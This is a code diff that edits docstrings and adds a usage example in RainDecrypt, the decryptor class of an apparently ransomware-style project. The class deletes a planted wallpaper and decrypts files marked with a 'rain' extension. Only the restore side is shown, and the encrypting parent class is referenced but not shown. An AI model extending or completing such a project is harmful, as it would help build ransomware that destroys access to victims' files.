@@ -6,6 +6,11 @@ from .core.directory_iter import DirectoryIter
 class RainDecrypt(RainEncrypt):
     """
     Class intends to reverse the affects of RainEncrypt
+
+    Example Usage:
+
+        RainDecrypt("AES.key").do_final()
+
     """
     def __init__(self, aes_key_file_path):
         # instantiate super gives access to self.crypto and self.paths
@@ -13,7 +18,7 @@ class RainDecrypt(RainEncrypt):
 
     def __remove_back_ground_windows(self):
         """
-        deletes back ground image and restores original
+        Deletes back ground image and restores original
         I'll leaves this for you to implement
         """
         pass
@@ -27,8 +32,8 @@ class RainDecrypt(RainEncrypt):
 
     def __disinfect_all(self):
         """
-        iterate through target directories and decrypt each individual file
-        works for all platforms
+        Iterate through target directories and decrypts each individual file
+        Works for all platforms
         """
         for path in self.paths:
             for file in DirectoryIter(path).iter_files(path):
@@ -36,8 +41,8 @@ class RainDecrypt(RainEncrypt):
 
     def __decrypt(self, file_name: str):
         """
-        checks if file ends with the rain extension, if so it will
-        attempt to decrypt it
+        Checks if file ends with the rain extension, if so it will
+        attempt to decrypt it otherwise will ignore
 
         :param file_name: file to decrypt
         """
